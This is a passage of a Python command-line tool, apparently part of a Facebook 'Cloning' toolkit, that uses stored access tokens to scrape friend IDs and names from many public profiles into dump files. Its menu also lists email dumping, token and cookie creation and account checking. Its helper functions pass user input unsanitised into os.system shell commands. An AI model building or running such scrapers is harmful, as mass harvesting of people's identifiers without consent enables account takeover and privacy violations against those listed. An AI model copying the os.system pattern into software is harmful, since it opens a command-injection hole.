				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids10___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids11___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids12___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids13___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids14___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids15___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids16___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids17___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids18___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids19___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids20___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids21___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids22___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids23___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids24___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids25___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Cloning/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_multi_dump():
	print("\n[01] Dump ID From 02 Public User ID [ Max : 10K ]")
	print("[02] Dump ID From 03 Public User ID [ Max : 15K ]")
	print("[03] Dump ID From 05 Public User ID [ Max : 25K ]")
	print("[04] Dump ID From 08 Public User ID [ Max : 40K ]")
	print("[05] Dump ID From 10 Public User ID [ Max : 50K ]")
	print("[06] Dump ID From 15 Public User ID [ Max : 75K ]")
	print("[07] Dump ID From 20 Public User ID [ Max : 100K ]")
	print("[08] Dump ID From 25 Public User ID [ Max : 125K ]")
	multi_pub = input("\n[>>] Choose : ")
	if multi_pub in ["1","01"]:
		fb_x2_dump()
	elif multi_pub in ["2","02"]:
		fb_x3_dump()
	elif multi_pub in ["3","03"]:
		fb_x5_dump()
	elif multi_pub in ["4","04"]:
		fb_x8_dump()
	elif multi_pub in ["5","05"]:
		fb_x10_dump()
	elif multi_pub in ["6","06"]:
		fb_x15_dump()
	elif multi_pub in ["7","07"]:
		fb_x20_dump()
	elif multi_pub in ["8","08"]:
		fb_x25_dump()
	else:
		time.sleep(2)
		fb_menu()
def fb_auto_dump():
	logo()
	try:
		___token___ = open('Cloning/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = 'temp1'
	for zx in range(___total___):
		zx +=1
		___ids___ = input("[>>] Public User ID : ")
		if ___ids___ in ['',' ']:
			fb_menu()
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(100)&access_token=%s"%(___ids___,___token___)).json()
			file = open('Cloning/Facebook/Dump/'+___file___+'.txt', 'a')
			file2 = ('Cloning/Facebook/Dump/'+___file___+'.txt')
			for a in rex['friends']['data']:
				file.write(a['id']+'\n')
			file.close()
			uid_list = open('Cloning/Facebook/Dump/'+___file___+'.txt','r').read()
			uid3 = uid_list.split('')[3]
			___user___ = open('Cloning/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			print(uid3)
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def team():
	logo()
	print("[>>] Team Name : CodeX-ID")
	print("[>>] Team Owner : ")
	print("[>>] Team GitHub : https://github.com/CodeX-ID")
	print("[>>] Team CodeX-ID Members list\n")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	print("[>>] ")
	input("\n\n[>>] [ Back ] ")
	fb_menu()
def grep():
	logo()
	print("[*] Enter Separate Object Find In File - Example ");time.sleep(0.3)
	print("[*] 100077  -  100078  -  100079  -  100080  -  100081 ");time.sleep(0.3)
	print("[*] 1000  -  10000  -  100000  -  1000000  -   1000000 \n\n ");time.sleep(0.3)
	f = input('\033[0;97m[->] File Path : ')
	o = input('\033[0;97m[->] Save As : ')
	try:
		ask_link = int(input('[*] Enter Grip ID Limit : '))
	except:
		ask_link = 1
		completed = 0
	for links in range(ask_link):
		li = input('[*] Separate Object : ')
		os.system('cat '+f+' | grep "'+li+'" >> '+o)
	print("")
	print("[*] Separating Successful ")
	print("[*] New File Save " + o)
	print("\n\n")
	input("[*] Back ");time.sleep(2);fb_menu()
def dupcutter():
	logo()
	print("[*] File Duplicate Object Cutter - Auto Object ")
	print("[*] Enter File Path - \ - File Location  \n\n")
	bilal = input('[->] File Path   : ')
	haider = input('[->] New File Save As : ')
	os.system('touch ' +haider)
	os.system('sort -r '+bilal+' | uniq > '+haider)
	print("")
	print("")
	print("[*] Removing Successful  From File " + bilal )
	print("[*] New File Save " + haider )
	print("")
	print("")
	input("[*] Back ");time.sleep(2);fb_menu()
def ugen_hp():
	logo()
	print("[01] Save User-Agent Xiaomi ")
	print("[02] Save User-Agent Nokia ")
	print("[03] Save User-Agent Asus ")
	print("[04] Save User-Agent Huawei ")
	print("[05] Save User-Agent Vivo ")
	print("[06] Save User-Agent Oppo ")
	print("[07] Save User-Agent Window ")
	print("[08] Save User-Agent Samsung ")
	print("[09] Save User-Agent Customize ")
	pc = input("\n[>>] Choose : ")
	os.system("rm -rf Cloning/Facebook/Data/usergent.txt")
	if pc in['']:
		ugent_hp()
	elif pc in ['1','01']:
		ugent = open('Cloning/Facebook/Data/usergent.txt','w');ugent.write(ua_xaomi);ugent.close()
	elif pc in ['2','02']:
		ugent = open('Cloning/Facebook/Data/usergent.txt','w');ugent.write(ua_nokia);ugent.close()
	elif pc in ['3','03']:
		ugent = open('Cloning/Facebook/Data/usergent.txt','w');ugent.write(ua_asus);ugent.close()
	elif pc in ['4','04']:
		ugent = open('Cloning/Facebook/Data/usergent.txt','w');ugent.write(ua_huawei);ugent.close()
	elif pc in ['5','05']:
		ugent = open('Cloning/Facebook/Data/usergent.txt','w');ugent.write(ua_vivo);ugent.close()
	elif pc in ['6','06']:
		ugent = open('Cloning/Facebook/Data/usergent.txt','w');ugent.write(ua_oppo);ugent.close()
	elif pc in ['7','07']:
		ugent = open('Cloning/Facebook/Data/usergent.txt','w');ugent.write(ua_samsung);ugent.close()
	elif pc in ['8','08']:
		ugent = open('Cloning/Facebook/Data/usergent.txt','w');ugent.write(ua_windows);ugent.close()
	elif pc in ['9','09']:
		ua_costomize = input("[*] Enter Your User - Agent : ")
		agent = open('Cloning/Facebook/Data/usergent.txt','w');ugent.write(ua_costomize);ugent.close()
	jalan("[*] Successfully Changed User Agent ")
	input("[*] Back ");time.sleep(2);fb_menu()
def key_send():
	logo()
	os.system('xdg-open https://wa.me/+923440157745?text=' + key )
	time.sleep(2)
	fb_menu()
def fb_menu():
	logo()
	print("[>>] User IP : " + user_ip )
	print("[>>] User Country : " + user_country )
	print("[>>] User Region : " + user_regionName )
	print("[>>] Today Date : " + alldatex )
	print("[>>] User Key : " + key )
	print("-----------------------------------------------------------------")
	print("[01] Dump Facebook Public ID Single [ Login ]")
	print("[02] Dump Facebook Public ID Multi [ Login ]")
	print("[03]    ")
	print("[04]    ")
	print("[05] Dump Facebook ID Random New [ No Login ]")
	print("[06] Dump Facebook ID Random Old [ No Login ]")
	print("[07] Dump Facebook ID Random Most Old [ No Login ]")
	print("[08] Dump Email Account Facebook [ No Login ]")
	print("[09] Create Token And Cookie [ Login ]")
	print("[10] Free Facebook ID Token [ No Login ]")
	print("[11]    ")
	print("[12]    ")
	print("[13]   ")
	print("[14]    ")
	print("[15]    ")
	print("[16]    ")
	print("[17] ")
	print("[18] Facebook ID Separator [ Multi ]")
	print("[19] Duplicate ID Cutter")
	print("[20] Facebook Bot Account Chacker ")
	print("[21] Save Facebook Token")
	print("[22] Change Setting User-Agent")
	print("[23] ")
	print("[24] Script Team Info")
	print("[25] Exit [ Remove Token ]")
	fb_choose = input("\n[>>] Choose : ")
	if fb_choose in [""," "]:
		time.sleep(1.5)
		fb_menu()
	elif fb_choose in ["1","01"]:
		fb_single_dump()
	elif fb_choose in ["2","02"]:
		fb_multi_dump()
	elif fb_choose in ["3","03"]:
		fb_auto_dump()
	elif fb_choose in ["4","4"]:
		print("")
	elif fb_choose in ["5","05"]:
		dump_random_new()
	elif fb_choose in ["6","06"]:
		dump_random_old()
	elif fb_choose in ["7","07"]:
		dump_random_mostold()
	elif fb_choose in ["8","08"]:
		email_dump()
	elif fb_choose in ["9","09"]:
		create_token()
	elif fb_choose in ["10","010"]:
		auto_token()
	elif fb_choose in ["11","011"]:
		print("")
	elif fb_choose in ["12","012"]:
		print("")
	elif fb_choose in ["13","013"]:
		print("")
	elif fb_choose in ["14","014"]:
		print("")
	elif fb_choose in ["15","015"]:
		print("")
	elif fb_choose in ["16","016"]:
		print("")
	elif fb_choose in ["17","017"]:
		print("")
	elif fb_choose in ["18","018"]:
		grep()
	elif fb_choose in ["19","019"]:
		dupcutter()
	elif fb_choose in ["20","020"]:
		fb_acc_chacker()
	elif fb_choose in ["21","021"]:
		fb_login()
	elif fb_choose in ["22","022"]:
		ugen_hp()
	elif fb_choose in ["23","023"]:
		print("")
	elif fb_choose in ["24","024"]:
		team()
	elif fb_choose in ["25","025"]:
		os.system("rm -rf Cloning/Facebook/Data/fb_token.txt")
		exit("\n\n[*] Token Deleting Successfully")
	else:
		time.sleep(1.5)
		fb_menu()
if __name__=='__main__':
	fb_menu()
